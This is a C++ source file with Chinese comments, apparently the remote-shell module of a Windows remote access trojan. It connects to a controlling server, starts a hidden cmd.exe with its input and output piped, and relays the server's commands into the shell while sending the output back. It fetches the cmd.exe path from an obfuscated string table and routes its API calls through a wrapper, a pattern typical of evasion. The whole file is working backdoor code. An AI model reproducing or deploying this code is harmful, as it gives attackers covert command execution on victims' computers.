// MyTlntTrans.cpp: implementation of the CMyTlntTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyTlntTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyTlntTrans::CMyTlntTrans()
{
	hChildStdinRd = 0;
	hChildStdinWr = 0;
	hChildStdinWrDup = 0;
	hChildStdoutRd = 0;
	hChildStdoutWr = 0;
	hChildStdoutRdDup = 0;
	hSaveStdin = 0;
	hSaveStdout = 0;  
	hProcess = 0;
	m_gFunc.memset(m_CmdFilePath, 0, 256);
	pSendBuf = new char[8 * 1024 * 1024];
}

CMyTlntTrans::~CMyTlntTrans()
{
	delete [] pSendBuf;
}

UINT CMyTlntTrans::ReadLine(char* pReadBuf)
{
	UINT nReadCount = 0;
	DWORD dwRead = 0;
	char ch = 0;
	int nCount = 0;
	DWORD dMaxLen = 8 * 1024 * 1024 - 256;
	while(nReadCount <= dMaxLen)
	{
		if(!m_gFunc.ReadFile(hChildStdoutRdDup, &ch, 1, &dwRead, NULL) || dwRead == 0) 
		{
			return 0; 
		}
		pReadBuf[nReadCount] = ch;
		if(ch == '>')
		{
			nReadCount ++;
			if((nReadCount >= 5 &&
				pReadBuf[nReadCount - 1] == '>' &&
				pReadBuf[nReadCount - 2] == 'R' &&
				pReadBuf[nReadCount - 3] == 'I' &&
				pReadBuf[nReadCount - 4] == 'D' &&
				pReadBuf[nReadCount - 5] == '<'))
			{
				if(nCount++ < 80)
				{
					continue;
				}
			}
			break;
		}
		nReadCount ++;
	}
	return nReadCount;
}

void CMyTlntTrans::SendCmd()
{
	//开始发送数据
	DWORD dwRead = 0;
	while(1) 
	{ 
		dwRead = ReadLine(pSendBuf);
		if(dwRead == 0)
		{
			break;
		}

		if(!SendDataWithCmd(pSendBuf, dwRead, 0))
		{
			break;
		}
	}
	Close();
}

DWORD CMyTlntTrans::SendCmdThread(LPVOID lPvoid)
{
	CMyTlntTrans* pThis = (CMyTlntTrans*) lPvoid;
	pThis->SendCmd();
	return 0;
}

//控制线程
void CMyTlntTrans::StartWork(HWND hWnd)
{
	//连接到服务器
	if(!Create(WM_CONNECT_TLNT, hWnd))
	{
		return;
	}

	//创建进程,重定向
	if(CreateShellRedirect())
	{
		HANDLE hThread = m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SendCmdThread, (LPVOID) this, 0, NULL);
		DWORD dwRead = 0;
		DWORD dwBytesWritten = 0;
		DWORD nCmd = 0;
		BYTE* pRecvBuf = NULL;
		while(1)
		{
			if(pRecvBuf != NULL)
			{
				delete [] pRecvBuf;
				pRecvBuf = NULL;
			}

			//与主机通信
			if(!RecvDataWithCmd(&pRecvBuf, &dwRead, &nCmd))
			{
				break;
			}

			//自定义命令

			//发送命令到终端
			if(dwRead != 0)
			{
				m_gFunc.WriteFile(hChildStdinWrDup, pRecvBuf, dwRead, &dwBytesWritten, NULL);
			}
		}
		Close();

		if(pRecvBuf != NULL)
		{
			delete [] pRecvBuf;
		}
		if(hChildStdinRd != NULL)
		{
			hChildStdinRd = NULL;
			m_gFunc.CloseHandle(hChildStdinRd);
		}
		if(hChildStdoutWr != NULL)
		{
			hChildStdoutWr = NULL;
			m_gFunc.CloseHandle(hChildStdoutWr);
		}
		if(hChildStdinWrDup != NULL)
		{
			hChildStdinWrDup = NULL;
			m_gFunc.CloseHandle(hChildStdinWrDup);
		}
		if(hChildStdoutRdDup != NULL)
		{
			hChildStdoutRdDup = NULL;
			m_gFunc.CloseHandle(hChildStdoutRdDup);
		}
		m_gFunc.TerminateProcess(hProcess, 0);
	}
}

BOOL CMyTlntTrans::CreateShellRedirect()
{
	SECURITY_ATTRIBUTES saAttr = {0};
	BOOL fSuccess = FALSE;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	hSaveStdout = m_gFunc.GetStdHandle(STD_OUTPUT_HANDLE);  
	
	if(!m_gFunc.CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0))
	{
		return FALSE;
	}

	if(!m_gFunc.SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr))
	{
		return FALSE;
	}
   
    fSuccess = m_gFunc.DuplicateHandle(m_gFunc.GetCurrentProcess(), hChildStdoutRd, m_gFunc.GetCurrentProcess(), &hChildStdoutRdDup , 0,  FALSE, DUPLICATE_SAME_ACCESS );
	if(!fSuccess)
	{
      return FALSE;
	}
	m_gFunc.CloseHandle(hChildStdoutRd);
	
	hSaveStdin = m_gFunc.GetStdHandle(STD_INPUT_HANDLE);  

	// Create a pipe for the child process's STDIN.  
	if(!m_gFunc.CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0) || !m_gFunc.SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd))
	{
		return FALSE;
	}

	// Duplicate the write handle to the pipe so it is not inherited.  
	fSuccess = m_gFunc.DuplicateHandle(m_gFunc.GetCurrentProcess(), hChildStdinWr, m_gFunc.GetCurrentProcess(), &hChildStdinWrDup, 0, FALSE, DUPLICATE_SAME_ACCESS ); 
	if(!fSuccess ) 
	{
		return FALSE;
	}
	m_gFunc.CloseHandle(hChildStdinWr);

	if(!CreateChildProcessNoLogin())
	{
		return FALSE;
	}

	if(!m_gFunc.SetStdHandle(STD_INPUT_HANDLE, hSaveStdin) || !m_gFunc.SetStdHandle(STD_OUTPUT_HANDLE, hSaveStdout))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL CMyTlntTrans::CreateChildProcessNoLogin()
{
	//CMD.EXE
	char m_CmdFilePath[256] = {0};
	m_gFunc.GetMyString(10289, m_CmdFilePath, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	PROCESS_INFORMATION piProcInfo = {0};
	STARTUPINFOA siStartInfo = {0};  
	siStartInfo.cb = sizeof(STARTUPINFOA);
	siStartInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.wShowWindow = SW_HIDE;
	if(!m_gFunc.CreateProcess(NULL,	m_CmdFilePath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo))
	{
		return FALSE;
	}
	hProcess = piProcInfo.hProcess ;
	return TRUE;
}

